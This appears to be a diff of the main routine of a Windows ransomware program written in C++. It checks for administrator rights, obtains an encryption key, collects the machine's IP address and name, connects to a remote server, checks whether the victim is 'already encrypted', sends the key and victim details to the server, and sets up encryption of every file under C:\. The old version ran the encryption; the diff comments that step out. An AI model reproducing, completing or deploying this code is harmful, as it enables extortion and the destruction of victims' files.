@@ -1,61 +1,95 @@
+#include <iostream>
+#include <winsock2.h>
 #include "gg.h"
 
 int main(int argc, char* argv[])
 {
-    // Initialize COM
+    std::cout << "Program started." << std::endl;
+
+    __userDetils__ userDetails;
+
     HRESULT hr = CoInitialize(NULL);
     if (FAILED(hr))
     {
-        std::cerr << "Failed to initialize COM library." << std::endl;
+        std::cerr << "Failed to initialize COM library. HRESULT: " << hr << std::endl;
         return 1;
     }
 
-    // Check for administrative privileges
-    bool isAdmin = IsAdministrator(hr);
+    std::cout << "COM initialized successfully." << std::endl;
 
-    if (SUCCEEDED(hr))
+    bool isAdmin = IsAdministrator(hr);
+    std::cout << "Admin check result: " << isAdmin << std::endl;
+    if (!isAdmin)
     {
-        if (isAdmin)
-        {
-            std::cout << "The program is running with administrative privileges." << std::endl;
-        }
-        else
-        {
-            std::cout << "The program is NOT running with administrative privileges." << std::endl;
-        }
-    }
-    else
-    {
-        std::cerr << "Failed to determine administrative privileges. Error code: " << hr << std::endl;
+        std::cerr << "User is not an administrator." << std::endl;
         CoUninitialize();
         return 1;
     }
 
-    std::cin.get(); // Wait for user input to continue
-
-    // Prompt the user for the path to add to startup
     std::string path = get_this_file_path();
-	if (path.empty())
+    std::cout << "File path obtained: " << path << std::endl;
+    if (path.empty())
     {
-		std::cerr << "Failed to get the path to the program." << std::endl;
-		return 1;
-	}
-
-	std::cout << "File path: " << path << std::endl;
-	std::cout << "Press any key to continue..." << std::endl;
+        std::cerr << "Failed to get file path." << std::endl;
+        CoUninitialize();
+        return 1;
+    }
 
     int key = get_encryption_key();
-	std::cout << conccet_ip_and_computer_name(key) << std::endl;
-	std::cin.get(); // Wait for user input to continue
+    std::cout << "Encryption key obtained: " << key << std::endl;
 
-    //bool a = get_file_folders(key, "C:\\Users\\benda\\Documents\\staff", "", 1);
+    std::string details = conccet_ip_and_computer_name(key, &userDetails);
+    std::cout << "Details obtained: " << details << std::endl;
 
-    bool a = get_file_folders(63, "C:\\", "", -1);
+    std::cout << "Printing structure:" << std::endl;
+    printStructure(userDetails);
 
-	std::getchar(); // Wait for user input to continue
+    std::cout << "Saving structure to file." << std::endl;
+    saveStrucetInFile(userDetails);
 
-    return 0; // Exit with success
+    std::string folderPath = "C:\\";
+    std::cout << "Connecting to server." << std::endl;
+    SOCKET socket = connect_to_server();
+    if (socket == INVALID_SOCKET)
+    {
+        std::cerr << "Failed to connect to server. Invalid socket." << std::endl;
+        CoUninitialize();
+        return 1;
+    }
+
+    std::cout << "Checking if data is already encrypted." << std::endl;
+    if (alreadyEncrypted(socket, userDetails))
+    {
+        std::cout << "Data is already encrypted." << std::endl;
+        closesocket(socket);
+        WSACleanup();
+        return 1;
+    }
+
+    std::cout << "Sending data to server." << std::endl;
+    if (!send_data_to_server(socket, key, userDetails))
+    {
+        std::cerr << "Failed to send data to server." << std::endl;
+        closesocket(socket);
+        WSACleanup();
+        return 1;
+    }
+
+    // Uncomment the following code if needed for encryption
+    /*
+    std::cout << "Starting file encryption process." << std::endl;
+    bool success = get_file_folders(key, folderPath, "", -1);  // Mode 1 for encryption/decryption
+    if (!success)
+    {
+        std::cerr << "Failed to encrypt files." << std::endl;
+        CoUninitialize();
+        return 1;
+    }
+    */
+
+    std::cout << "Program completed successfully." << std::endl;
+
+    // Clean up COM
+    CoUninitialize();
+    return 0;
 }
-
-
-
